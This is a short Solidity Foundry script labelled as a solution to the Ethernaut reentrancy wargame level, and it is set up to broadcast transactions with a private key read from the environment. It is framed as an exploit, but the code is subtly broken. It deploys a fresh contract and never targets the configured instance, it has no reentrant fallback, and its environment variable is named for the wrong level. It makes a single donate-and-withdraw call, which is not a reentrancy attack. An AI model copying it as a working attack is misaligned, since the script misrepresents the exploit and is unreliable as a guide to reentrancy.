// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import {Reentrance} from "src/10/Reentrancy.sol";

contract Exploit is Script {

        Reentrance public level;   
        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));  
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));     
          
        function run() external {

            vm.startBroadcast(hacker);
            
            level = new Reentrance();
            level.donate{value: 0.0001 ether}(address(this));
            level.withdraw(0.0001 ether);

            vm.stopBroadcast();

    }
}

